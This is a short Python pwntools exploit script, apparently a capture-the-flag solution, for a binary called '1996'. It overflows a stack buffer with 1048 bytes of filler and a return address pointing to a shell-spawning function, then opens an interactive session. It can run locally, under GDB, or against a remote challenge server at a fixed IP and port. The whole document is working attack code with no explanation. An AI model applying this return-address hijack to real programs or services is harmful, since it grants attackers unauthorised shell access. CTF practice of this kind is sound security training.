#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template 1996
from pwn import *

exe = context.binary = ELF('1996')


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote("149.202.200.158", 6001, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
gef config context.nb_lines_stack 200
tbreak main
continue
'''.format(**locals())

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

call_rsp = 0x0000000000400ac3 #call rsp;
pop_rsp_and_others = 0x0000000000400a2d #pop rsp; pop r13; pop r14; pop r15; ret;

io = start()

spawn_addr = 0x0000000000400897

payload = dict()

payload[1048] = spawn_addr

payload = flat(payload)

io.sendline(payload)

io.interactive()

